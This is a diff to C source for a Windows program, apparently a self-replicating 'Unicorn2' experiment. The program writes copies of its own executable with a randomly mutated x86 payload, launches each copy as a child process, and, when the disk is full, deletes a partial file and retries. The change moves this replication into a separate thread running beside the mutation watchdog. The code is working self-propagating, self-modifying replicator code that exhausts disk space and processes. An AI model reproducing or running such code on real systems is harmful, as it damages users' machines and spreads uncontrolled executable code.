@@ -32,12 +32,6 @@ void MuNxtPayload();
 void PopCtl(void);
 
 void create_process(char *ascii_path);
-__inline void create_proc_worker()
-{
-    strcpy(nextEXE_NTPath, currentDIR);
-    strcat(nextEXE_NTPath, nextEXEName);
-    create_process(nextEXE_NTPath);
-}
 
 __inline void die_handler()
 {
@@ -45,6 +39,34 @@ __inline void die_handler()
     sprintf(nextEXE_NTPath, "\\??\\%s", global_argv[0]);
     create_process(nextEXE_NTPath);
     RtlExitUserProcess(-1);
+}
+
+void make_child_exe()
+{
+    Sleep(GapTime); // wait for growing up & mutation...
+    for (int i = 0; i < NextNum; i++)
+    {
+        FILE *fp = NULL;
+        gen_next:
+        while (fp == NULL)
+        {
+            sprintf(nextEXEName, "Unicorn2-%X.exe", Get_Hardware_Rand() & 0xFFFF);
+            fp = fopen(nextEXEName, "wb");
+        }
+        fwrite(myFileBuffer, 1, myStaticLength, fp);
+        size_t bytes_written = fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
+        if (bytes_written != NextPayloadSize) {
+            printf("Disk already full... Try to overwrite existing...\n");
+            fclose(fp); fp = NULL; remove(nextEXEName);
+            goto gen_next;
+        }
+        fclose(fp); fp = NULL; // Unlock the file
+        strcpy(nextEXE_NTPath, currentDIR);
+        strcat(nextEXE_NTPath, nextEXEName);
+        create_process(nextEXE_NTPath);
+        Sleep(GapTime);
+    }
+    printf("All child processes created...\n");
 }
 
 int main(int argc, char** argv)
@@ -91,50 +113,30 @@ int main(int argc, char** argv)
         }
         nextPayloadBuf[NextPayloadSize - 1] = 0xC3; // RET
     }
-
-    for (int i = 0; i < NextNum; i++)
+    HANDLE hProductionThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)make_child_exe, 0, 0, 0);
+    // mutation one time
+    HANDLE hMuThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MuNxtPayload, 0, 0, 0);
+    while(WaitForSingleObject(hMuThread, GapTime) == WAIT_TIMEOUT) // Thread is still alive
     {
-        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MuNxtPayload, 0, 0, 0);
-        while(WaitForSingleObject(hThread, GapTime) == WAIT_TIMEOUT) // Thread is still alive
+        if (time(NULL) - MuWatchDog > 20)
         {
-            if (time(NULL) - MuWatchDog > 20)
-            {
-                // owari, suicide
-                printf("Mutation Thread Dead Loop...\n");
-                RtlExitUserProcess(-1);
-            }
-            if (time(NULL) - MuWatchDog > 10)
-            {
-                printf("Mutation Watchdog Timeout, revert x86 code\n");
-                for(int i=0; i<x86MaxInsLen; i++)
-                {
-                    nextPayloadBuf[MuPos + i] = BackupBuf[i];
-                }
-            }
-            else
-            {
-                printf("Good Mutation Thread\n");
-            }
+            // owari, suicide
+            printf("Mutation Thread Dead Loop...\n");
+            RtlExitUserProcess(-1);
         }
-        CloseHandle(hThread);
-        
-        gen_next:
-        while (fp == NULL)
+        if (time(NULL) - MuWatchDog > 10)
         {
-            sprintf(nextEXEName, "Unicorn2-%X.exe", Get_Hardware_Rand() & 0xFFFF);
-            fp = fopen(nextEXEName, "wb");
+            printf("Mutation Watchdog Timeout, revert x86 code\n");
+            for(int i=0; i<x86MaxInsLen; i++)
+            {
+                nextPayloadBuf[MuPos + i] = BackupBuf[i];
+            }
         }
-        fwrite(myFileBuffer, 1, myStaticLength, fp);
-        size_t bytes_written = fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
-        if (bytes_written != NextPayloadSize) {
-            printf("Disk already full... Try to overwrite existing...\n");
-            fclose(fp); fp = NULL; remove(nextEXEName);
-            goto gen_next;
+        else
+        {
+            printf("Good Mutation Thread\n");
         }
-        Sleep(GapTime); // Delay is important here to avoid producing so fast
-        fclose(fp); fp = NULL; // Unlock the file
-
-        //ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
-        create_proc_worker();
     }
+    CloseHandle(hMuThread); hMuThread = NULL;
+    WaitForSingleObject(hProductionThread, INFINITE);
 }
